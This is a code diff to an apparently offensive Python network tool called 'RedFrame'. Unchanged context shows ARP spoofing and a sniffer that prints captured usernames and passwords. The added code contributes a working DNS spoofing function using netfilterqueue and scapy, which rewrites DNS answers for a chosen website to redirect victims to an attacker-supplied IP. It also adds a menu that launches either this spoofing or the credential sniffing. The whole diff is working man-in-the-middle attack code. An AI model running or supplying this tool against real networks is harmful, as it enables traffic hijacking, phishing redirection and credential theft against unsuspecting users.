@@ -4,6 +4,7 @@ import time
 import scapy.all as scapy
 import psutil
 import threading
+import netfilterqueue
 import argparse
 import sys
 from scapy.layers import http
@@ -106,6 +107,27 @@ def process_packet(packet):
         if login_info:
             print("\n\n[+] Possible username/password > " + login_info.decode() + "\n\n") # note ".decode" must be used in Python3
 
+# Function designed to process and spoof a DNS Response packet for a targeted URL and webserver
+def dns_spoof(packet):
+    scapy_packet = scapy.IP(packet.get_payload()) # convert packet payload to Scapy packet
+    if scapy_packet.haslayer(scapy.DNSRR): #DNSRR = DNS Request Response
+        dnsqry = scapy_packet[scapy.DNSQR].qname # DNS query website
+        if tgt_url in dnsqry.decode():
+            print ("[+] Spoofing target website: " + tgt_url)
+            dnsresponse = scapy.DNSRR(rrname=dnsqry, rdata=tgt_ip)
+            scapy_packet[scapy.DNS].ancount = 1 # modified to reflect only 1 DNS response
+            scapy_packet[scapy.DNS].an = dnsresponse
+
+            # General packet cleanup to allow scapy to create checksums and lengths to packets are valid
+            del scapy_packet[scapy.IP].len # delete IP length data so scapy will recalculate the packetlenth in the response
+            del scapy_packet[scapy.IP].chksum  # delete IP chksum data so scapy will recalculate the packetlenth in the response
+            del scapy_packet[scapy.UDP].len  # delete UDP length data so scapy will recalculate the packetlenth in the response
+            del scapy_packet[scapy.UDP].chksum  # delete UDP chksum data so scapy will recalculate the packetlenth in the response
+
+            packet.set_payload(bytes(scapy_packet)) # set packet payload to manipulated scapy packet
+
+    packet.accept() # forward packet to target
+
 
 tgt_network = input("Enter target network range or individual ip address to scan > ")
 scan_result = scan(tgt_network)
@@ -130,31 +152,58 @@ stop_script = False # variable used to stop/kill threads
 tspoof = threading.Thread(target=spoof, args=(targetip1, targetmac1, targetip2, targetmac2, lambda:stop_script))
 tspoof.start()
 
-interfaces = get_network_interfaces()  # get all network interfaces on host machine (OS independent)
 print(colored("-------------------------------------------------------", 'red'))
-print("Interface\tIP Addr\t\t\tNet Mask")
+print("Option\tMenu Selection")
 print(colored("-------------------------------------------------------", 'red'))
-for interface in interfaces:
-    # based on structure of returned list
-    # interface[1][0][1] = IPv4 address
-    # interface[1][0][2] = IPv4 net mask
-    print(str(interface[0]) + "\t\t" + str(interface[1][0][1]) + "\t\t" + str(interface[1][0][2]))
+print("1.\tDNS Spoofing")
+print("2.\tSniff Traffic on Interface")
+menu_select = input("Enter RedFrame option > ")
 
-# Solicit user input for interface on which to initiate sniffing
-tgt_int = input("Enter interface to sniff packets on e.g. eth0 > ")
+if menu_select == "1":
+    try:
+        global tgt_url
+        global tgt_ip
+        print("\n")
+        tgt_url = input("Enter URL of website to spoof > ")
+        tgt_ip = input("Enter IP of webserver to redirect traffic to > ")
 
-# Sniff traffic on user directed interface
-print(colored("\nSniffing traffic on interface: " + tgt_int + "\n", 'green'))
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0, dns_spoof)
+        queue.run()
 
-#create thread for sniffing traffic and start the thread as a daemon which will terminate upon script termination
-tsniff = threading.Thread(target=sniff, args=(tgt_int, lambda:stop_script))
-tsniff.daemon = True
-tsniff.start()
+    except KeyboardInterrupt:
+        # restore target machine's ARP tables
+        print("[+] Detected User input CTRL + C ...... Restoring target ARP tables and ending sniffing")
+        stop_script = True
+        sys.exit()
 
-try:
-    time.sleep(10000)
-except KeyboardInterrupt:
-    # restore target machine's ARP tables
-    print("[+] Detected User input CTRL + C ...... Restoring target ARP tables and ending sniffing")
-    stop_script = True
-    sys.exit()
+elif menu_select == "2":
+
+    interfaces = get_network_interfaces()  # get all network interfaces on host machine (OS independent)
+    print(colored("-------------------------------------------------------", 'red'))
+    print("Interface\tIP Addr\t\t\tNet Mask")
+    print(colored("-------------------------------------------------------", 'red'))
+    for interface in interfaces:
+        # based on structure of returned list
+        # interface[1][0][1] = IPv4 address
+        # interface[1][0][2] = IPv4 net mask
+        print(str(interface[0]) + "\t\t" + str(interface[1][0][1]) + "\t\t" + str(interface[1][0][2]))
+
+    # Solicit user input for interface on which to initiate sniffing
+    tgt_int = input("Enter interface to sniff packets on e.g. eth0 > ")
+
+    # Sniff traffic on user directed interface
+    print(colored("\nSniffing traffic on interface: " + tgt_int + "\n", 'green'))
+
+    #create thread for sniffing traffic and start the thread as a daemon which will terminate upon script termination
+    tsniff = threading.Thread(target=sniff, args=(tgt_int, lambda:stop_script))
+    tsniff.daemon = True
+    tsniff.start()
+
+    try:
+        time.sleep(10000)
+    except KeyboardInterrupt:
+        # restore target machine's ARP tables
+        print("[+] Detected User input CTRL + C ...... Restoring target ARP tables and ending sniffing")
+        stop_script = True
+        sys.exit()
